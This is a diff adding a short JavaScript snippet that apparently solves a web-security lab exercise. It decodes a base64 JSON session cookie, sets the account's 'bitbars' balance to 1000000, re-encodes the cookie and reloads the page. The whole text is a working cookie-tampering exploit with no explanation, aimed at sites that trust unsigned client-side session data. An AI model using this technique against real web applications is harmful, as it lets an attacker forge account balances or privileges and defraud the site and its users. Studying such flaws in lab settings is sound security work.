@@ -1,0 +1,12 @@
+let session_cookie= document.cookie.split(';')[0].split('=')[1];
+
+let decoded_cookie=window.atob(session_cookie);
+let decoded_cookie_obj=JSON.parse(decoded_cookie);
+
+decoded_cookie_obj["account"]["bitbars"]="1000000";
+let modified_cookie=JSON.stringify(decoded_cookie_obj);
+
+let encoded_cookie=window.btoa(modified_cookie);
+
+document.cookie=`session=${encoded_cookie}; `;
+document.location.reload();
